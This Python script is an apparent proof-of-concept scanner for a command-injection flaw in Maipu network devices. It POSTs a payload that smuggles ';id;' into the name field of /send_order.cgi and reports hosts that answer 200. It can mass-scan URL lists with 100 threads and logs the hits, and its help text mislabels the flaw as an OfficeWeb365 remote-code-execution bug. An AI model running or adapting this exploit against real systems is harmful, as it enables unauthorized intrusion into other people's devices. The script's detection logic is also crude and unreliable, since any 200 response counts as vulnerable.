import requests, sys, argparse, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                   
                ███╗   ███╗ █████╗ ██╗██████╗ ██╗   ██╗██████╗ ██╗   ██╗ ██████╗ 
                ████╗ ████║██╔══██╗██║██╔══██╗██║   ██║██╔══██╗██║   ██║██╔═══██╗
                ██╔████╔██║███████║██║██████╔╝██║   ██║██║  ██║██║   ██║██║   ██║
                ██║╚██╔╝██║██╔══██║██║██╔═══╝ ██║   ██║██║  ██║██║   ██║██║   ██║
                ██║ ╚═╝ ██║██║  ██║██║██║     ╚██████╔╝██████╔╝╚██████╔╝╚██████╔╝
                ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                                                                                                                                       
                                                                                    author:秋妤
                                                                                    time:2024.9.16
                                                                                    version:1.0
"""
    print(test)



def poc(target):
    payload_url = "/send_order.cgi?parameter=operation"
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '40',
        'Priority': 'u=1',
    }
    data = """{"opid":"1","name":";id;","type":"rest"}"""

    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=15)
        if res.status_code == 200:
            print(f"[+]{target}存在漏洞\n")
            with open('迈普多_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]{target}不存在漏洞")
    except:
        print(f"[*]该url存在问题")

def main():
    banner()
    parser = argparse.ArgumentParser(description='OfficeWeb365 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

if __name__ == '__main__':
    main()